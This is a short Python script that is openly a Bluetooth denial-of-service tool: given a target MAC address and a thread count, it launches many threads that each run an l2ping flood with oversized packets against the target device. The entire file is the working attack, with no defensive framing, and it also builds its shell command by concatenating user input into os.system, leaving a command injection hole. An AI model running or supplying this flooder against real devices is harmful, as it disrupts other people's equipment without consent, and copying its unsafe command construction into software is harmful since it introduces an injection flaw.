import os
from sys import argv
import threading
import time
import subprocess

def ATTACK(mac):
    #print(mac)
    #remove [' and '] from mac address
    mac = mac.replace("[", "")
    mac = mac.replace("]", "")
    mac = mac.replace("'", "")
    mac = mac.replace(" ", "")
    os.system("l2ping -i hci0 -s 600 -d 1 " + mac)

def main():

    if len(argv) != 3:
        print("Usage: python3 %s <mac> <threads>" % argv[0])
        exit()
    array = []
    target = argv[1]
    threads = argv[2]

    #parse target input so that ATTACK() can be called with the mac address
    array.append(target)



    for i in range(0, int(threads)):
        threading.Thread(target=ATTACK, args=[(str(array))]).start()
        

if __name__ == "__main__":
    try:
        os.system("clear")
        main()
    except KeyboardInterrupt:
        print("[-] Keyboard Interrupt Detected! Exiting...")
        exit()
    except Exception as e:
        print("[-] An Error Occured: %s" % e)
        exit()